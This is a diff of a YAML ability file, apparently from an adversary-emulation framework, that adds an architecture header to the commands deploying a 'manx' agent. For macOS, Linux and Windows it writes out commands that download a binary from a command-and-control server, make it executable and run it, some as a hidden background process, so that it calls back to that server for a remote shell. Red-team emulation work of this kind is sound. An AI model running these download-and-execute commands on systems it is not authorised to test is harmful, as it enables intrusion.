@@ -14,7 +14,7 @@
           server="#{app.contact.http}";
           socket="#{app.contact.tcp}";
           contact="tcp";
-          curl -s -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > #{agents.implant_name};
+          curl -s -X POST -H "file:manx.go" -H "platform:darwin" -H "architecture:#{agents.architecture}" $server/file/download > #{agents.implant_name};
           chmod +x #{agents.implant_name};
           ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
         variations:
@@ -23,7 +23,7 @@
               server="#{app.contact.http}";
               socket="#{app.contact.udp}";
               contact="udp";
-              curl -s -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download > #{agents.implant_name};
+              curl -s -X POST -H "file:manx.go" -H "platform:darwin" -H "architecture:#{agents.architecture}" $server/file/download > #{agents.implant_name};
               chmod +x #{agents.implant_name};
               ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
           - description: Download with a random name and start as a background process
@@ -31,7 +31,7 @@
               server="#{app.contact.http}";
               socket="#{app.contact.tcp}";
               contact="tcp";
-              agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:darwin" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:darwin" -H "architecture:#{agents.architecture}" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
               nohup ./$agent -http $server -socket $socket -contact $contact &
     linux:
       sh:
@@ -39,7 +39,7 @@
           server="#{app.contact.http}";
           socket="#{app.contact.tcp}";
           contact="tcp";
-          curl -s -X POST -H "file:manx.go" -H "platform:linux" $server/file/download > #{agents.implant_name};
+          curl -s -X POST -H "file:manx.go" -H "platform:linux" -H "architecture:#{agents.architecture}" $server/file/download > #{agents.implant_name};
           chmod +x #{agents.implant_name};
           ./#{agents.implant_name} -http $server -socket $socket -contact $contact -v
         variations:
@@ -48,14 +48,14 @@
               server="#{app.contact.http}";
               socket="#{app.contact.udp}";
               contact="udp";
-              agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" -H "architecture:#{agents.architecture}" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
               nohup ./$agent -http $server -socket $socket -contact $contact &
           - description: Download with a random name and start as a background process
             command: |
               server="#{app.contact.http}";
               socket="#{app.contact.tcp}";
               contact="tcp";
-              agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              agent=$(curl -svkOJ -X POST -H "file:manx.go" -H "platform:linux" -H "architecture:#{agents.architecture}" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
               nohup ./$agent -http $server -socket $socket -contact $contact &
     windows:
       psh:
@@ -67,6 +67,7 @@
           $url="$server/file/download";
           $wc=New-Object System.Net.WebClient;
           $wc.Headers.add("platform","windows");
+          $wc.Headers.add("architecture","#{agents.architecture}");
           $wc.Headers.add("file","manx.go");
           $data=$wc.DownloadData($url);
           Get-Process | ? {$_.Path -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f -ea $ErrAction;
@@ -83,6 +84,7 @@
               $url="$server/file/download";
               $wc=New-Object System.Net.WebClient;
               $wc.Headers.add("platform","windows");
+              $wc.Headers.add("architecture","#{agents.architecture}");
               $wc.Headers.add("file","manx.go");
               $data=$wc.DownloadData($url);
               Get-Process | ? {$_.Path -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f -ea $ErrAction;
